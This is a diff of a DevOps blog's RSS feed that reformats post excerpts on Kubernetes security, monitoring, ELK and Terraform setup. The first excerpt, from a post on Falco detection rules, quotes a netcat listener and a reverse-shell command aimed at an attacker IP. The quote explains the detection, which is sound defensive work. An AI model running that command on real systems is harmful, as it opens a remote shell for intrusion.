@@ -13,9 +13,16 @@
       <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/falco-reverse-shell-rules/</guid>
-      <description>Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
+      <description>
+        
+          
+            Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
 for example
-Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.</description>
+Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -24,12 +31,19 @@ Netcat can be used to both set up a shell listener and initiate reverse shell co
       <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/kubernetes-security-checklist/</guid>
-      <description>Cloud native workflow security checklist
+      <description>
+        
+          
+            Cloud native workflow security checklist
 Development security Integrate Code Scanning at the CI/CD Process
 SAST (Static Application Security Testing) tools sonarqube, gosec various language lint itegration the IDE plugins Enabled the gitlab ci security or github action scan Reduce external vulnerabilities via dependency scanning
 various language dependency check(npm, maven, go.mod, reqirements.txt) dependency-check plugin Use image scanning to analyze container images
 Avoid unnecessary privileges
-Rootless containers Make sure the user specified in the USER instruction exists inside the container.</description>
+Rootless containers Make sure the user specified in the USER instruction exists inside the container.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -38,9 +52,16 @@ Rootless containers Make sure the user specified in the USER instruction exists 
       <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/k8s-app-runtime-sparate/</guid>
-      <description>In a k8s environment, it is a good choice to have the application runtime and source code build packages separated in separate containers
+      <description>
+        
+          
+            In a k8s environment, it is a good choice to have the application runtime and source code build packages separated in separate containers
 Smallest source code build image use a smallest base image to build docker image store source code build result package
-1FROM alpine:latest 2WORKDIR /var/www 3COPY app /var/www/app Use different images of the runtime environment according to different programming languages 1FROM python:3.6.15-slim 2 3RUN pip install boto3 Build app image and runtime image 1# build the app image 2docker build .</description>
+1FROM alpine:latest 2WORKDIR /var/www 3COPY app /var/www/app Use different images of the runtime environment according to different programming languages 1FROM python:3.6.15-slim 2 3RUN pip install boto3 Build app image and runtime image 1# build the app image 2docker build .
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -49,8 +70,15 @@ Smallest source code build image use a smallest base image to build docker image
       <pubDate>Sat, 05 Mar 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/awesome-open-source/</guid>
-      <description>There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
-Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let&amp;rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.</description>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-based cloud os! Let&amp;rsquo;s sealos run kubernetes and applications.) https://github.com/kubevela/kubevela(The Modern Application Platform.) https://github.com/crossplane/crossplane(Cloud Native Control Planes multi cloud resoures) https://promcat.io/(A resource catalog for enterprise-class Prometheus) https://hub.datree.io/(Prevent Kubernetes misconfigurations from reaching production) https://aws.github.io/aws-eks-best-practices/(EKS Best Practices Guides) https://github.com/koderover/zadig(Zadig is a cloud native, distributed, developer-oriented continuous delivery product) https://github.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -59,8 +87,15 @@ Cloud native and kubernetes https://github.com/labring/sealos(kubernetes-kernel-
       <pubDate>Mon, 10 Jan 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/awesome-blog-resources/</guid>
-      <description>There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
-Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/browse/(Microsoft products with step-by-step guidance) https://developer.mozilla.org/en-US/docs/Learn(Mizzla learn guides about web development) https://programming.guide/go/(Articles on Programming Guide) https://gobyexample.com/(hands-on introduction to Go using annotated example programs) https://roadmap.sh/(Step by step guides and paths to learn different tools or technologies) https://zetcode.com/(provides accessible tutorials for Go, C#, Python, Java, and JavaScript programming languages.</description>
+      <description>
+        
+          
+            There are often some excellent blogs and open source website learning resources that need to be recorded Also for better sharing and dissemination, so the total continues below.
+Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/browse/(Microsoft products with step-by-step guidance) https://developer.mozilla.org/en-US/docs/Learn(Mizzla learn guides about web development) https://programming.guide/go/(Articles on Programming Guide) https://gobyexample.com/(hands-on introduction to Go using annotated example programs) https://roadmap.sh/(Step by step guides and paths to learn different tools or technologies) https://zetcode.com/(provides accessible tutorials for Go, C#, Python, Java, and JavaScript programming languages.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -69,7 +104,14 @@ Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/
       <pubDate>Mon, 10 Jan 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/software-deployment-security-terminology/</guid>
-      <description>General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) </description>
+      <description>
+        
+          
+            General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) 
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -78,8 +120,15 @@ Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/
       <pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/go-private-package-registry-athens/</guid>
-      <description>Setup GO private package repositry ATHENS for project development Use Nexus proxy access public go package and private repository repo
-1#The access workflow 2 3 |------&amp;gt; proxy-public internal 4internal.pack.com/goproxy---&amp;gt;nexus 5 |------&amp;gt;athens---&amp;gt;nginx---&amp;gt; private gitlab The pull package workflow - set the environment variable `export GOPROXY=internal.pack.com/goproxy` - setup nexus proxy the internal athens and public go proxy repo - the athens access internal gitlab code repo needs nginx rewrite the some paths - because athens needs https access the code repo Generate the private certificate 1openssl req -x509 -nodes -days 876000 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.</description>
+      <description>
+        
+          
+            Setup GO private package repositry ATHENS for project development Use Nexus proxy access public go package and private repository repo
+1#The access workflow 2 3 |------&amp;gt; proxy-public internal 4internal.pack.com/goproxy---&amp;gt;nexus 5 |------&amp;gt;athens---&amp;gt;nginx---&amp;gt; private gitlab The pull package workflow - set the environment variable `export GOPROXY=internal.pack.com/goproxy` - setup nexus proxy the internal athens and public go proxy repo - the athens access internal gitlab code repo needs nginx rewrite the some paths - because athens needs https access the code repo Generate the private certificate 1openssl req -x509 -nodes -days 876000 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -88,8 +137,15 @@ Recommend getting stared study resources https://docs.microsoft.com/en-us/learn/
       <pubDate>Mon, 15 Nov 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/k8s-cluster-offline-setup/</guid>
-      <description>Sometimes enterprise is ineternal network not has internet network in production The offline installing and setup k8s environment and resources is necessery Prepare the terraform environment Download the Terraform binary terraform You can also download the HELM binary to operate the k8s cluster. 1wget https://releases.hashicorp.com/terraform/0.15.4/terraform_0.15.4_linux_amd64.zip 2unzip terraform_0.15.4_linux_amd64.zip 3mv terraform /usr/local/bin/ 4chmod +x /usr/local/bin/terraform 5terraform version Prepare the Terraform syntax tips plugins in idea IDE https://plugins.jetbrains.com/plugin/7808-hashicorp-terraform--hcl-language-support
-Because the Terraform plugins and providers Offline to local directory and push to CVS repo so needs to install git lfs plugins</description>
+      <description>
+        
+          
+            Sometimes enterprise is ineternal network not has internet network in production The offline installing and setup k8s environment and resources is necessery Prepare the terraform environment Download the Terraform binary terraform You can also download the HELM binary to operate the k8s cluster. 1wget https://releases.hashicorp.com/terraform/0.15.4/terraform_0.15.4_linux_amd64.zip 2unzip terraform_0.15.4_linux_amd64.zip 3mv terraform /usr/local/bin/ 4chmod +x /usr/local/bin/terraform 5terraform version Prepare the Terraform syntax tips plugins in idea IDE https://plugins.jetbrains.com/plugin/7808-hashicorp-terraform--hcl-language-support
+Because the Terraform plugins and providers Offline to local directory and push to CVS repo so needs to install git lfs plugins
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -98,9 +154,16 @@ Because the Terraform plugins and providers Offline to local directory and push 
       <pubDate>Wed, 20 Oct 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/launch-hashistack-through-ansible/</guid>
-      <description>Sometimes we need to manage distributed task scheduling and secure clandestine transport, so introducing HashiStack is a good choice
+      <description>
+        
+          
+            Sometimes we need to manage distributed task scheduling and secure clandestine transport, so introducing HashiStack is a good choice
 Prepare Ansible script and playbook I choice the following playbook roles for stacks,But I changed things to suit my own needs
-Consul: github url Nomad: github url Vault use both repo community-ansibleand MiteshSharma/AnsiblevaultRole 1# The playbook folder level 2├── site.yml 3├── nomad-dev.local 4├── ansible.cfg 5├── roles 6│ ├── consul 7│ └── nomad 8│ └── vault 9└── group_vars 10 ├── consul 11 └── nomad 12 └── vault the ansible.</description>
+Consul: github url Nomad: github url Vault use both repo community-ansibleand MiteshSharma/AnsiblevaultRole 1# The playbook folder level 2├── site.yml 3├── nomad-dev.local 4├── ansible.cfg 5├── roles 6│ ├── consul 7│ └── nomad 8│ └── vault 9└── group_vars 10 ├── consul 11 └── nomad 12 └── vault the ansible.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -109,8 +172,15 @@ Consul: github url Nomad: github url Vault use both repo community-ansibleand Mi
       <pubDate>Sat, 25 Sep 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/deployment-promethues-grafana/</guid>
-      <description>Deploymnet Prometheus+Grafana in single machine use docker-compose service Collect and report node status in grafana dashboard, through node-exporter and process-exporter to promethues tsdb
-Setup and install relative components 1#update the system and install docker component 2yum update -y 3yum install -y yum-utils 4yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 5yum install -y docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8mkdir -p /data/monitor/{alertmanager,prometheus/{config,data},consul/data,grafana/data} 9chmown -R 1000:1000 /data/monitor 10chmod -R 777 /data/monitor/grafana Download the monitoring relative docker images 1docker pull prom/prometheus:latest 2docker pull grafana/grafana:latest 3docker pull prom/alertmanager:latest 4docker pull prom/pushgateway:latest 5docker pull consul:latest Prepare docker-compose.</description>
+      <description>
+        
+          
+            Deploymnet Prometheus+Grafana in single machine use docker-compose service Collect and report node status in grafana dashboard, through node-exporter and process-exporter to promethues tsdb
+Setup and install relative components 1#update the system and install docker component 2yum update -y 3yum install -y yum-utils 4yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 5yum install -y docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8mkdir -p /data/monitor/{alertmanager,prometheus/{config,data},consul/data,grafana/data} 9chmown -R 1000:1000 /data/monitor 10chmod -R 777 /data/monitor/grafana Download the monitoring relative docker images 1docker pull prom/prometheus:latest 2docker pull grafana/grafana:latest 3docker pull prom/alertmanager:latest 4docker pull prom/pushgateway:latest 5docker pull consul:latest Prepare docker-compose.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -119,8 +189,15 @@ Setup and install relative components 1#update the system and install docker com
       <pubDate>Mon, 20 Sep 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/make-ansible-docker-image/</guid>
-      <description>Make Ansible docker image for CI/CD workfolws Sometimes need connect to the remote host use publickey and jump server,copy the ssh key to docker image is necessary
-The Dockerfile 1FROM centos:7 2 3ARG SSH_PRIVATE_KEY 4ARG SSH_HOST_CONFIG 5 6RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo &amp;amp;&amp;amp; \ 7 yum clean all &amp;amp;&amp;amp; yum makecache fast &amp;amp;&amp;amp; \ 8 yum install -y epel-release gcc libffi-devel openssh-clients git wget &amp;amp;&amp;amp; \ 9 yum install -y python python2-pip ansible 10 11RUN python -m pip install &amp;#34;pysocks&amp;#34; &amp;#34;pyspnego==0.</description>
+      <description>
+        
+          
+            Make Ansible docker image for CI/CD workfolws Sometimes need connect to the remote host use publickey and jump server,copy the ssh key to docker image is necessary
+The Dockerfile 1FROM centos:7 2 3ARG SSH_PRIVATE_KEY 4ARG SSH_HOST_CONFIG 5 6RUN curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo &amp;amp;&amp;amp; \ 7 yum clean all &amp;amp;&amp;amp; yum makecache fast &amp;amp;&amp;amp; \ 8 yum install -y epel-release gcc libffi-devel openssh-clients git wget &amp;amp;&amp;amp; \ 9 yum install -y python python2-pip ansible 10 11RUN python -m pip install &amp;#34;pysocks&amp;#34; &amp;#34;pyspnego==0.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -129,8 +206,15 @@ The Dockerfile 1FROM centos:7 2 3ARG SSH_PRIVATE_KEY 4ARG SSH_HOST_CONFIG 5 6RUN
       <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/docker-compose-elk/</guid>
-      <description>install ELK stack use docker-compose Install and setup ELK stack in single machine use docker compose service. and uesfilebeat ship the logs
-settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manager \ 3 --add-repo \ 4 https://download.docker.com/linux/centos/docker-ce.repo 5sudo yum install docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8# install the docker-compose 9sudo curl -L &amp;#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;#34; -o /usr/local/bin/docker-compose 10chmod +x /usr/local/bin/docker-compose 11 12# adjust the system parmeters 13echo &amp;#34;vm.</description>
+      <description>
+        
+          
+            install ELK stack use docker-compose Install and setup ELK stack in single machine use docker compose service. and uesfilebeat ship the logs
+settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manager \ 3 --add-repo \ 4 https://download.docker.com/linux/centos/docker-ce.repo 5sudo yum install docker-ce docker-ce-cli containerd.io 6systemctl enable docker 7systemctl start docker 8# install the docker-compose 9sudo curl -L &amp;#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;#34; -o /usr/local/bin/docker-compose 10chmod +x /usr/local/bin/docker-compose 11 12# adjust the system parmeters 13echo &amp;#34;vm.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -139,7 +223,14 @@ settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manag
       <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/ansible-encrypt-secure/</guid>
-      <description>Wrap the ansible vault scripts 1#!/usr/bin/env bash 2 3[ &amp;#34;$#&amp;#34; -gt 2 ] || { 4 echo &amp;#34;Usage $0 encrypt|decrypt option...&amp;#34; 5 echo &amp;#34;Must be least three argumeents required&amp;#34; 6 exit 1 7} 8 9#the decrypt key file path, also can put the aws ssm 10vault_id=&amp;#39;/opt/ansible_pass&amp;#39; 11 12 13function encrypt() { 14 ansible-vault encrypt_string --vault-password-file $1 $2 --name $3 15} 16 17function decrypt() { 18 ansible -i $1 $2 -m ansible.</description>
+      <description>
+        
+          
+            Wrap the ansible vault scripts 1#!/usr/bin/env bash 2 3[ &amp;#34;$#&amp;#34; -gt 2 ] || { 4 echo &amp;#34;Usage $0 encrypt|decrypt option...&amp;#34; 5 echo &amp;#34;Must be least three argumeents required&amp;#34; 6 exit 1 7} 8 9#the decrypt key file path, also can put the aws ssm 10vault_id=&amp;#39;/opt/ansible_pass&amp;#39; 11 12 13function encrypt() { 14 ansible-vault encrypt_string --vault-password-file $1 $2 --name $3 15} 16 17function decrypt() { 18 ansible -i $1 $2 -m ansible.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -148,8 +239,15 @@ settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manag
       <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/elastic-cloud-ingest-pipeline/</guid>
-      <description>The syntax ingest pipeline template convenient for search
-1[ 2 { 3 &amp;#34;grok&amp;#34;: { 4 &amp;#34;field&amp;#34;: &amp;#34;message&amp;#34;, 5 &amp;#34;patterns&amp;#34;: [ 6 &amp;#34;%{IPORHOST:remote_addr} - %{USERNAME:remote_user} \\[%{HTTPDATE:time_local}\\] \\\&amp;#34;%{DATA:request}\\\&amp;#34; %{INT:status} %{NUMBER:bytes_sent} \\\&amp;#34;%{DATA:http_referer}\\\&amp;#34; \\\&amp;#34;%{DATA:http_user_agent}\\\&amp;#34; \\\&amp;#34;%{DATA:http_x_forwarded_for}\\\&amp;#34; rt=\\\&amp;#34;(?:%{NUMBER:request_time}|-)\\\&amp;#34; uct=\\\&amp;#34;(?:%{NUMBER:upstream_connect_time}|-)\\\&amp;#34; uht=\\\&amp;#34;(?:%{NUMBER:upstream_header_time}|-)\\\&amp;#34; urt=\\\&amp;#34;(?:%{NUMBER:upstream_response_time}|-)\\\&amp;#34;&amp;#34; 7 ], 8 &amp;#34;ignore_missing&amp;#34;: true, 9 &amp;#34;if&amp;#34;: &amp;#34;ctx.source.toLowerCase().contains(&amp;#39;nginx&amp;#39;)&amp;#34;, 10 &amp;#34;ignore_failure&amp;#34;: true, 11 &amp;#34;description&amp;#34;: &amp;#34;nginx&amp;#34; 12 } 13 }, 14 { 15 &amp;#34;grok&amp;#34;: { 16 &amp;#34;field&amp;#34;: &amp;#34;source&amp;#34;, 17 &amp;#34;patterns&amp;#34;: [ 18 &amp;#34;^/var/www/webapp/logs/(?&amp;lt;app_id&amp;gt;[^/]+)&amp;#34; 19 ], 20 &amp;#34;ignore_missing&amp;#34;: true, 21 &amp;#34;if&amp;#34;: &amp;#34;ctx.</description>
+      <description>
+        
+          
+            The syntax ingest pipeline template convenient for search
+1[ 2 { 3 &amp;#34;grok&amp;#34;: { 4 &amp;#34;field&amp;#34;: &amp;#34;message&amp;#34;, 5 &amp;#34;patterns&amp;#34;: [ 6 &amp;#34;%{IPORHOST:remote_addr} - %{USERNAME:remote_user} \\[%{HTTPDATE:time_local}\\] \\\&amp;#34;%{DATA:request}\\\&amp;#34; %{INT:status} %{NUMBER:bytes_sent} \\\&amp;#34;%{DATA:http_referer}\\\&amp;#34; \\\&amp;#34;%{DATA:http_user_agent}\\\&amp;#34; \\\&amp;#34;%{DATA:http_x_forwarded_for}\\\&amp;#34; rt=\\\&amp;#34;(?:%{NUMBER:request_time}|-)\\\&amp;#34; uct=\\\&amp;#34;(?:%{NUMBER:upstream_connect_time}|-)\\\&amp;#34; uht=\\\&amp;#34;(?:%{NUMBER:upstream_header_time}|-)\\\&amp;#34; urt=\\\&amp;#34;(?:%{NUMBER:upstream_response_time}|-)\\\&amp;#34;&amp;#34; 7 ], 8 &amp;#34;ignore_missing&amp;#34;: true, 9 &amp;#34;if&amp;#34;: &amp;#34;ctx.source.toLowerCase().contains(&amp;#39;nginx&amp;#39;)&amp;#34;, 10 &amp;#34;ignore_failure&amp;#34;: true, 11 &amp;#34;description&amp;#34;: &amp;#34;nginx&amp;#34; 12 } 13 }, 14 { 15 &amp;#34;grok&amp;#34;: { 16 &amp;#34;field&amp;#34;: &amp;#34;source&amp;#34;, 17 &amp;#34;patterns&amp;#34;: [ 18 &amp;#34;^/var/www/webapp/logs/(?&amp;lt;app_id&amp;gt;[^/]+)&amp;#34; 19 ], 20 &amp;#34;ignore_missing&amp;#34;: true, 21 &amp;#34;if&amp;#34;: &amp;#34;ctx.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -158,9 +256,16 @@ settings the centos system 1sudo yum install -y yum-utils 2sudo yum-config-manag
       <pubDate>Thu, 15 Jul 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/eck-vs-flutd-collect-logs/</guid>
-      <description>Use the Elasticsearch cloud on k8s component as logs and apm platform. the Fluentd collect the kubernetes container logs to Elasticsearch and kibana represent and search
+      <description>
+        
+          
+            Use the Elasticsearch cloud on k8s component as logs and apm platform. the Fluentd collect the kubernetes container logs to Elasticsearch and kibana represent and search
 The ECK operator configure The ECK operator custom resources use kubectl providers.
-1terraform { 2 required_providers { 3 kubectl = { 4 source = &amp;#34;gavinbunney/kubectl&amp;#34; 5 version = &amp;#34;1.11.1&amp;#34; 6 } 7 } 8} 9 10resource &amp;#34;helm_release&amp;#34; &amp;#34;eck-operator&amp;#34; { 11 chart = &amp;#34;${path.module}/../../../../../charts/eck-operator&amp;#34; 12 name = &amp;#34;eck-operator&amp;#34; 13 namespace = &amp;#34;kube-monitor&amp;#34; 14 15 values = [ 16 &amp;lt;&amp;lt;-EOF 17 image: 18 repository: &amp;#34;${var.</description>
+1terraform { 2 required_providers { 3 kubectl = { 4 source = &amp;#34;gavinbunney/kubectl&amp;#34; 5 version = &amp;#34;1.11.1&amp;#34; 6 } 7 } 8} 9 10resource &amp;#34;helm_release&amp;#34; &amp;#34;eck-operator&amp;#34; { 11 chart = &amp;#34;${path.module}/../../../../../charts/eck-operator&amp;#34; 12 name = &amp;#34;eck-operator&amp;#34; 13 namespace = &amp;#34;kube-monitor&amp;#34; 14 15 values = [ 16 &amp;lt;&amp;lt;-EOF 17 image: 18 repository: &amp;#34;${var.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -169,9 +274,16 @@ The ECK operator configure The ECK operator custom resources use kubectl provide
       <pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/omnidb-installing/</guid>
-      <description>OmniDB is tool for unify the multiple type DataBase management,appropriate deploy in enterprise internal proxy access to other environment.
+      <description>
+        
+          
+            OmniDB is tool for unify the multiple type DataBase management,appropriate deploy in enterprise internal proxy access to other environment.
 fetch the Dockerfile in this url: OminDB Dockerfile Build the docker image docker build . -t dev.com/library/omnidb:latest then push the image to registry:docker push dev.com/library/omnidb:latest
-create the kubernetes deployment manifest file 1apiVersion: v1 2kind: PersistentVolumeClaim 3metadata: 4 name: omnidb-pvc 5spec: 6 accessModes: 7 - ReadWriteOnce 8 storageClassName: nfs-client 9 resources: 10 requests: 11 storage: 5Gi 12--- 13apiVersion: apps/v1 14kind: Deployment 15metadata: 16 name: omnidb-deployment 17 labels: 18 app: omnidb 19spec: 20 replicas: 1 21 selector: 22 matchLabels: 23 app: omnidb 24 template: 25 metadata: 26 labels: 27 app: omnidb 28 spec: 29 containers: 30 - name: omnidb 31 image: dev.</description>
+create the kubernetes deployment manifest file 1apiVersion: v1 2kind: PersistentVolumeClaim 3metadata: 4 name: omnidb-pvc 5spec: 6 accessModes: 7 - ReadWriteOnce 8 storageClassName: nfs-client 9 resources: 10 requests: 11 storage: 5Gi 12--- 13apiVersion: apps/v1 14kind: Deployment 15metadata: 16 name: omnidb-deployment 17 labels: 18 app: omnidb 19spec: 20 replicas: 1 21 selector: 22 matchLabels: 23 app: omnidb 24 template: 25 metadata: 26 labels: 27 app: omnidb 28 spec: 29 containers: 30 - name: omnidb 31 image: dev.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -180,9 +292,16 @@ create the kubernetes deployment manifest file 1apiVersion: v1 2kind: Persistent
       <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/installing-eclipse-che-in-kubernetes/</guid>
-      <description>At first installing OLM Requirement: kubectl configred and connect to Kubernetes cluster correct.
+      <description>
+        
+          
+            At first installing OLM Requirement: kubectl configred and connect to Kubernetes cluster correct.
 1curl -L https://github.com/operator-framework/operator-lifecycle-manager/releases/download/v0.17.0/install.sh -o install.sh 2chmod +x install.sh 3./install.sh v0.17.0 Installing Eclipse-Che Operator According to: eclipse-che operator
-1kubectl create -f https://operatorhub.io/install/eclipse-che.yaml 2# view the Operator resources 3kubectl get pods --all-namespaces | grep olm 4# and the CluseterServiceVersion 5kubectl get csv -n my-eclipse-che Install Eclipse-che instance use CheCluster resource 1#The partial configure need to change 2 k8s: 3 ingressClass: &amp;#39;nginx&amp;#39; 4 ingressDomain: &amp;#39;che.</description>
+1kubectl create -f https://operatorhub.io/install/eclipse-che.yaml 2# view the Operator resources 3kubectl get pods --all-namespaces | grep olm 4# and the CluseterServiceVersion 5kubectl get csv -n my-eclipse-che Install Eclipse-che instance use CheCluster resource 1#The partial configure need to change 2 k8s: 3 ingressClass: &amp;#39;nginx&amp;#39; 4 ingressDomain: &amp;#39;che.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -191,8 +310,15 @@ create the kubernetes deployment manifest file 1apiVersion: v1 2kind: Persistent
       <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/kubernetes-events-to-es/</guid>
-      <description>We what collect and storage kubernetes events to elasticsearch, easy to query and analyze alerts. we use this github repo componentkubernetes-event-exporter
-The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource &amp;#34;kubernetes_deployment&amp;#34; &amp;#34;event_export&amp;#34; { 2 metadata { 3 name = &amp;#34;event-export&amp;#34; 4 namespace = &amp;#34;kube-system&amp;#34; 5 labels = { 6 app = &amp;#34;event-export&amp;#34; 7 } 8 } 9 10 spec { 11 replicas = 1 12 13 selector { 14 match_labels = { 15 app = &amp;#34;event-export&amp;#34; 16 } 17 } 18 19 template { 20 metadata { 21 labels = { 22 app = &amp;#34;event-export&amp;#34; 23 version = &amp;#34;v1&amp;#34; 24 } 25 } 26 27 spec { 28 service_account_name = kubernetes_service_account.</description>
+      <description>
+        
+          
+            We what collect and storage kubernetes events to elasticsearch, easy to query and analyze alerts. we use this github repo componentkubernetes-event-exporter
+The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource &amp;#34;kubernetes_deployment&amp;#34; &amp;#34;event_export&amp;#34; { 2 metadata { 3 name = &amp;#34;event-export&amp;#34; 4 namespace = &amp;#34;kube-system&amp;#34; 5 labels = { 6 app = &amp;#34;event-export&amp;#34; 7 } 8 } 9 10 spec { 11 replicas = 1 12 13 selector { 14 match_labels = { 15 app = &amp;#34;event-export&amp;#34; 16 } 17 } 18 19 template { 20 metadata { 21 labels = { 22 app = &amp;#34;event-export&amp;#34; 23 version = &amp;#34;v1&amp;#34; 24 } 25 } 26 27 spec { 28 service_account_name = kubernetes_service_account.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -201,7 +327,14 @@ The main.tf include kubernetes &amp;lsquo;deployment&amp;rsquo; object 1resource
       <pubDate>Wed, 02 Dec 2020 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/terraform-helm-fluentd/</guid>
